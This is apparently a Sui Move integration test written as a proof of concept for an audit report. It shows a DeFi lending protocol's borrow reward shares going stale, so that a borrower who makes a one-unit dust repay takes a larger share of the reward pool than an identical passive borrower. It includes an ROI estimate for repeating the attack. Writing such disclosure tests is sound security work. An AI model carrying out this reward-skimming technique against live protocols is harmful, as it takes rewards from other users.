// PoC for Report #034: Borrow Reward Shares Become Stale Between Interactions
//
// Target: borrow.move:60-66, repay.move:56-62 (share = total_borrow.floor())
//         reward_manager.move:211-225 (change_obligation_reward_manager_share)
// Place in: contracts/protocol/tests/integration/test_cases/
// Run:   sui move test --filter poc_034
//
// Bug: Borrow-side liquidity mining reward shares are only updated when
//      a user interacts (borrow, repay, liquidation). Between interactions,
//      debt grows via interest accrual but the reward share remains stale.
//      Frequent interactors capture disproportionate rewards.
//
// Attack:
//   1. Attacker and passive user both borrow 500 USDC (equal positions)
//   2. Time passes → both debts grow to ~504 USDC via interest
//   3. Attacker does dust repay (1 USDC) → share updates to ~503
//   4. Passive user's share stays at 500
//   5. Reward distribution: attacker gets 503/1003 ≈ 50.15%
//      vs fair share of 50%. Advantage scales with interest delta.
//
// Cost/Impact analysis:
//   - Attack cost: 1 dust repay tx on Sui (~$0.01 gas)
//   - Reward advantage: ~0.3% per 30 days at 8% APR on each interaction
//   - With daily dust interactions over 30 days at $100K reward pool:
//     attacker extracts ~$300 extra vs $0.30 gas cost → 1000:1 ROI
//
// Expected: test PASSES, proving attacker gets more rewards than passive

#[test_only]
module protocol::poc_034_borrow_reward_staleness {
    use sui::test_scenario;
    use sui::clock;

    use protocol::market_t::MainMarket;
    use test_coin::eth::ETH;
    use test_coin::usdc::USDC;
    use test_coin::usdt::USDT;
    use protocol::oracle_t;
    use protocol::open_obligation_t;
    use protocol::market_t::default_eth_decimal_places;
    use protocol::market_t::default_stable_decimal_places;
    use protocol::liquidity_miner::get_borrow_reward_type;

    const ADMIN: address = @0xAD;
    const ATTACKER: address = @0xAA;
    const PASSIVE: address = @0xBB;

    /// Proves that an attacker who does dust repay gets more borrow rewards
    /// than a passive user with an identical borrow position.
    ///
    /// The borrow reward share is set to `total_borrow.floor()` — which
    /// only reflects accrued interest WHEN the user interacts. Between
    /// interactions, the share is stale (lower than true debt).
    ///
    /// By doing a dust repay, the attacker triggers interest accrual on
    /// their obligation and updates their share to the current (higher)
    /// debt value. The passive user's share remains at the original
    /// (lower) borrow amount.
    #[test]
    fun test_attacker_captures_excess_borrow_rewards() {
        let mut scenario_value = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_value;
        let mut clock = clock::create_for_testing(scenario.ctx());

        // Step 1: Init market
        let (admin_cap, mut app, mut market, coin_registry) =
            protocol::app_t::default_app_init<MainMarket>(scenario, &mut clock, ADMIN);
        let mut x_oracle = oracle_t::init_t(scenario);

        // Step 2: Set prices
        clock.set_for_testing(100_000); // T = 100s (100_000 ms)
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));
        x_oracle.update_price<USDT>(&clock, oracle_t::calc_scaled_price(1, 0));

        // Step 3: Admin creates borrow reward pool for USDC
        // 1,000,000 USDT rewards over 90 days (reward_start to reward_end)
        let reward_start_ms = 100_000; // T = 100s
        let reward_end_ms = 100_000 + 90 * 24 * 3600 * 1000; // T + 90 days
        let reward_amount = 1_000_000 * 10u64.pow(default_stable_decimal_places());
        let reward_coins = sui::coin::mint_for_testing<USDT>(
            reward_amount, scenario.ctx()
        );

        scenario.next_tx(ADMIN);
        protocol::liquidity_mining_admin::add_liquidity_mining_rewards<MainMarket, USDC, USDT>(
            &admin_cap, &app, &mut market,
            get_borrow_reward_type(),
            reward_coins,
            reward_start_ms,
            reward_end_ms,
            &clock,
            scenario.ctx()
        );

        // Step 4: ATTACKER deposits 2 ETH, borrows 500 USDC
        // Both users need sufficient collateral
        scenario.next_tx(ATTACKER);
        let attacker_cap = open_obligation_t::open_obligation_t<MainMarket>(
            scenario, &app, &mut market
        );
        let eth_coin_a = sui::coin::mint_for_testing<ETH>(
            2 * 10u64.pow(default_eth_decimal_places()), scenario.ctx()
        );
        protocol::deposit::deposit<MainMarket, ETH>(
            &app, &mut market, &attacker_cap, eth_coin_a, &clock, scenario.ctx()
        );
        scenario.next_tx(ATTACKER);
        let borrow_amount = 500 * 10u64.pow(default_stable_decimal_places());
        let borrowed_a = protocol::borrow::borrow<MainMarket, USDC>(
            &app, &attacker_cap, &mut market, &coin_registry,
            borrow_amount, &x_oracle, &clock, scenario.ctx()
        );
        std::unit_test::destroy(borrowed_a);

        // Step 5: PASSIVE user deposits 2 ETH, borrows 500 USDC (identical)
        scenario.next_tx(PASSIVE);
        let passive_cap = open_obligation_t::open_obligation_t<MainMarket>(
            scenario, &app, &mut market
        );
        let eth_coin_b = sui::coin::mint_for_testing<ETH>(
            2 * 10u64.pow(default_eth_decimal_places()), scenario.ctx()
        );
        protocol::deposit::deposit<MainMarket, ETH>(
            &app, &mut market, &passive_cap, eth_coin_b, &clock, scenario.ctx()
        );
        scenario.next_tx(PASSIVE);
        let borrowed_b = protocol::borrow::borrow<MainMarket, USDC>(
            &app, &passive_cap, &mut market, &coin_registry,
            borrow_amount, &x_oracle, &clock, scenario.ctx()
        );
        std::unit_test::destroy(borrowed_b);
        // At this point: both have share = 500 USDC, total_shares = 1000

        // Step 6: Advance 45 days (half the reward period)
        // Interest accrues on both positions but neither share is updated.
        // At ~8% APR, 45 days ≈ 0.99% interest → debts ≈ 504.9 USDC each
        let t_half = 100_000 + 45 * 24 * 3600 * 1000;
        clock.set_for_testing(t_half);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

        // Step 7: ATTACKER does dust repay (1 raw USDC)
        // This triggers accrue_interest → obligation debt updates → share updates
        // Attacker's new share ≈ 504.9 (reflecting accrued interest)
        // Passive's share remains 500 (stale)
        // total_shares = 504.9 + 500 = 1004.9
        // Attacker's reward share: 504.9/1004.9 ≈ 50.24% (should be 50%)
        scenario.next_tx(ATTACKER);
        let dust_repay = sui::coin::mint_for_testing<USDC>(1, scenario.ctx());
        protocol::repay::repay<MainMarket, USDC>(
            &app, &mut market, &attacker_cap, dust_repay, &clock, scenario.ctx()
        );

        // Step 8: Advance to end of reward period (90 days total)
        let t_end = reward_end_ms + 1000;
        clock.set_for_testing(t_end);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));

        // Step 9: Both claim borrow rewards
        scenario.next_tx(ATTACKER);
        let attacker_reward = protocol::liquidity_mining::claim_reward_as_coin<MainMarket, USDC, USDT>(
            &app, &mut market, &attacker_cap,
            get_borrow_reward_type(),
            0, // reward_index = 0 (first pool)
            &clock,
            scenario.ctx()
        );

        scenario.next_tx(PASSIVE);
        let passive_reward = protocol::liquidity_mining::claim_reward_as_coin<MainMarket, USDC, USDT>(
            &app, &mut market, &passive_cap,
            get_borrow_reward_type(),
            0,
            &clock,
            scenario.ctx()
        );

        // Step 10: ASSERT — attacker captured more rewards than passive
        // Despite identical borrow positions, the dust repay gave the
        // attacker a higher reward share for the second half of the period.
        let attacker_amount = attacker_reward.value();
        let passive_amount = passive_reward.value();

        // Attacker must have earned strictly more than passive
        assert!(attacker_amount > passive_amount, 0);

        // The excess comes entirely from the stale share bug:
        // attacker's share was updated to reflect interest (504.9),
        // while passive's share stayed stale at the original borrow (500).
        // In a fair system, both would receive equal rewards.

        // Cleanup
        std::unit_test::destroy(attacker_reward);
        std::unit_test::destroy(passive_reward);
        clock::destroy_for_testing(clock);
        test_scenario::return_shared(market);
        std::unit_test::destroy(admin_cap);
        std::unit_test::destroy(attacker_cap);
        std::unit_test::destroy(passive_cap);
        std::unit_test::destroy(app);
        std::unit_test::destroy(x_oracle);
        std::unit_test::destroy(coin_registry);
        scenario_value.end();
    }
}
